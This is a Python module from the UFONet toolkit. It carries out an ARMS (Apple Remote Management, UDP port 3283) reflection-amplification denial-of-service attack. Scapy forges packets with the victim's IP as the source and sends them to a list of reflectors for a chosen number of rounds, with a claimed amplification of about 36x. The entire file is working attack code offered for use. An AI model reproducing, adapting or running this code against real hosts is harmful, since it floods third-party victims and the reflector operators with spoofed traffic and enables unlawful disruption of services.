#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
This file is part of the UFONet project, https://ufonet.03c8.net

Copyright (c) 2013/2026 | psy <epsylon@riseup.net>

You should have received a copy of the GNU General Public License along
with UFONet; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket
from urllib.parse import urlparse
try:
    from scapy.all import *
except ImportError:
    from core._ensure import ensure
    if ensure('scapy.all', 'scapy') is None:
        print("\nError importing: scapy lib.\n")
        sys.exit(2)
    from scapy.all import *

arms_file = "botnet/arms.txt"

# UFONet Apple Remote Management Service Amplification (POLISH) - amp factor ~36x (UDP/3283)
def polishize(ip, rounds):
    n=0
    try:
        from core._botnet import load_botnet_file, warn_placeholders
        reflectors, _empty, _all_placeholder = load_botnet_file(arms_file)
        if _empty:
            print("[Error] [AI] [POLISH] botnet/arms.txt is empty -> [Aborting!]")
            return
        if _all_placeholder:
            warn_placeholders("POLISH", arms_file, kind="arms")
            return
        payload = b'\x00\x14\x00\x01\x00\x03'
        for x in range(int(rounds)):
            n += 1
            print("[Info] [AI] [POLISH] Wiping 'mirror' ["+str(n)+"] over the orchard! -> [SLOWING!]")
            for r in reflectors:
                try:
                    sport = random.randint(2000, 65535)
                    packet = IP(dst=r, src=ip) / UDP(sport=sport, dport=3283) / Raw(load=payload)
                    send(packet, verbose=0)
                    print("[Info] [AI] [POLISH] Wiped 'mirror' ["+str(n)+"] IS INTERACTING WITH ["+r+"] -> [AMPLIFYING!]")
                except Exception:
                    print("[Info] [AI] [POLISH] Wiped 'mirror' ["+str(n)+"] FAILED to reach ["+r+"] -> [PASSING!]")
    except:
        print("[Error] [AI] [POLISH] Failing to engage... -> Is still target online? -> [Checking!]")

class ARMS(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] ARMS Amplification (POLISH) is ready to fire: [", rounds, "mirrors ]")
        if target.startswith('http://'):
            target = target.replace('http://','')
        elif target.startswith('https://'):
            target = target.replace('https://','')
        try:
            ip = socket.gethostbyname(target)
        except Exception:
            try:
                import dns.resolver
                r = dns.resolver.Resolver()
                from core._dns_pool import random_resolvers; r.nameservers = random_resolvers(2)
                url = urlparse(target)
                a = r.resolve(url.netloc, "A")
                for rd in a:
                    ip = str(rd)
            except Exception:
                ip = target
        if ip == "127.0.0.1" or ip == "localhost":
            print("[Info] [AI] [POLISH] Targeting 'localhost' -> [OK!]\n")
            return
        polishize(ip, rounds)
